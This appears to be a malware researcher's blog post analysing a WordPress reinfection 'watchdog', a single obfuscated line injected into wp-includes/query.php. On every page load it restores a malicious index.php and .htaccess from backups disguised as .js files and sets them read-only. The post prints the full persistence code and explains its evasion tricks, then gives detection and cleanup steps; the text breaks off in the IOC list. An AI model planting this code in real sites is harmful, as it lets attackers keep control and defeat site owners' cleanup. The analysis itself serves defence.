---
title: One Line in query.php That Brings index.php and .htaccess Back From the Dead
url: https://lukeleal.com/research/posts/query-php-reinfection-watchdog/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:23.571423
---

# One Line in query.php That Brings index.php and .htaccess Back From the Dead

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [One Line in query.php That Brings index.php and .htaccess Back From the Dead](https://lukeleal.com/research/posts/query-php-reinfection-watchdog/)

2023-10-18Luke

#[query.php](https://lukeleal.com/research/tags/query.php/)
#[reinfection](https://lukeleal.com/research/tags/reinfection/)
#[persistence](https://lukeleal.com/research/tags/persistence/)
#[.htaccess](https://lukeleal.com/research/tags/.htaccess/)
#[index.php](https://lukeleal.com/research/tags/index.php/)
#[backdoor](https://lukeleal.com/research/tags/backdoor/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[PHP](https://lukeleal.com/research/tags/php/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![One Line in query.php That Brings index.php and .htaccess Back From the Dead](https://lukeleal.com/research/query-watchdog-cover-q90.jpg "Cover Image")

## Table of Contents

* [Finding the Change](#finding-the-change)
* [How It Works](#how-it-works)
  + [The chmod values](#the-chmod-values)
* [Why This Beats a Normal Cleanup](#why-this-beats-a-normal-cleanup)
* [What the Sample Doesn’t Tell Us](#what-the-sample-doesnt-tell-us)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Sample](#sample)

A frustrating thing to see in a cleanup is a file you just fixed going back to its infected version. You clean `index.php`, reload the site, and the malware is back.

This sample shows one way that happens. It’s **one line of PHP** added to `wp-includes/query.php`, and it is the entire persistence mechanism.

## Finding the Change[#](#finding-the-change)

`query.php` is a WordPress core file, so I could diff the sample against a clean copy. I compared it with `query.php` from WordPress 6.6 and found only two differences:

1. A tiny docblock wording difference, which is just a WordPress version difference.
2. The injected line, placed directly in front of `function is_front_page()`:

```
$inxxdex = $_SERVER['DOCUMENT_ROOT'].'/ind'.'ex.php';
$hct     = $_SERVER['DOCUMENT_ROOT'].'/.htac'.'cess';
$bddex   = $_SERVER['DOCUMENT_ROOT'].'/wp-admin/js/widgets/media-in-auth-widg.js';
$bksht   = $_SERVER['DOCUMENT_ROOT'].'/wp-admin/js/widgets/media-h-auth-widg.js';

if($inxxdex && file_exists($bddex)){
    if(!file_exists($inxxdex) or (filesize($inxxdex) != filesize($bddex))){
        chmod($inxxdex,'420');
        file_put_contents($inxxdex,file_get_contents($bddex));
        chmod($inxxdex,'292');
    }
}
if($hct && file_exists($bksht)){
    if(!file_exists($hct) or (filesize($hct) != filesize($bksht))){
        chmod($hct,'420');
        file_put_contents($hct,file_get_contents($bksht));
        chmod($hct,'292');
    }
}
$inxxdex = "";function is_front_page() {
```

(I’ve split it across lines. In the file it’s all on one line.)

The injection is stuck onto the end of the docblock that belongs to `is_front_page()`, so in an editor the file looks like a normal comment followed by a line of code. And it uses the same trick as many other samples: `'/ind'.'ex.php'` and `'/.htac'.'cess'` are split so that searching for `index.php` or `.htaccess` in the file wouldn’t match.

## How It Works[#](#how-it-works)

`query.php` is loaded by WordPress on every request, and this code sits at file scope, not inside a function. So **every page view** runs these checks:

1. The attacker keeps **backup copies** of the malicious `index.php` and `.htaccess` in `wp-admin/js/widgets/`, named:
   * `media-in-auth-widg.js` (the backup of `index.php`)
   * `media-h-auth-widg.js` (the backup of `.htaccess`)
2. If the real file is missing, or its size differs from the backup’s size, it is overwritten with the backup.
3. The real file is then locked read-only.

Look at the `wp-admin/js/widgets/` folder in a clean WordPress install and you’ll see `media-audio-widget.js`, `media-gallery-widget.js`, `media-image-widget.js`, `media-video-widget.js`, `media-widgets.js`, `text-widgets.js` and `custom-html-widgets.js`. The backups are named to blend in with those, and they have a `.js` extension so nobody expects PHP code in them. (My [WordPress keylogger post](https://lukeleal.com/research/posts/wp-login-keylogger/) found a stolen-password log hiding in this same folder as `text-user.js`.)

### The chmod values[#](#the-chmod-values)

```
chmod($inxxdex,'420');
...
chmod($inxxdex,'292');
```

At first these look like random numbers. File permissions are written in octal, and these are the **decimal** equivalents: `420` is `0644` (owner can write) and `292` is `0444` (read only for everyone). The author wrote them in decimal, which is why they look odd, but PHP accepts the numeric string and converts it to an integer.

Each restore does three steps: make the file writable, overwrite it, then make it read-only. The read-only part is annoying for the person doing the cleanup. When you try to edit `index.php` and your editor says permission denied, that’s a clue.

## Why This Beats a Normal Cleanup[#](#why-this-beats-a-normal-cleanup)

* **Deleting the infected `index.php` doesn’t work.** It’s missing on the next request, so it’s restored.
* **Replacing it with a clean copy doesn’t work.** The sizes don’t match, so the infected backup overwrites it.
* **Fixing the file in place doesn’t work either**, for the same reason.
* The same goes for `.htaccess`. A clean `.htaccess` with the redirect rules removed is replaced with the version the attacker wants.

The only way to break the cycle is to remove the *source* of the restore: the `query.php` line and the two backups, before you touch `index.php` and `.htaccess`. If you clean in the other order, the watchdog undoes your work and you may not realize why.

One limitation: it only compares **file sizes**. If a replacement file were the same size as the backup it would be left alone, but a legitimate file practically never is.

## What the Sample Doesn’t Tell Us[#](#what-the-sample-doesnt-tell-us)

* I don’t have the **contents** of the backup files. They’re stand-ins for whatever the attacker wants in `index.php` and `.htaccess`, which on a hacked WordPress site is typically a redirect, a doorway page, or a loader. Check what’s in them when you find them.
* The sample is filed under “security disabler” in the library I got it from, but I didn’t find anything in it that disables security software. The only difference from stock core is the persistence line. If something else is turning off your protection, it’s elsewhere.

## Detection & Cleanup[#](#detection--cleanup)

1. **Run `wp core verify-checksums`.** It will flag `wp-includes/query.php`, since core files shouldn’t differ from the official release.
2. Search for `media-in-auth-widg.js`, `media-h-auth-widg.js`, and any other `media-*` files in `wp-admin/js/widgets/` that aren’t in the list above.
3. Look for `$_SERVER['DOCUMENT_ROOT']` together with `file_put_contents` in `wp-includes/`. WordPress core doesn’t do that.
4. Spot check permissions. `index.php` and `.htaccess` at `0444`, when the rest of the site is `0644`, is a red flag.
5. **Order matters:** fix `query.php` first, delete both backup `.js` files, *then* restore `index.php` and `.htaccess`.

## IOCs[#](#iocs)

```
wp-includes/query.php  (modified, injected before is_fro...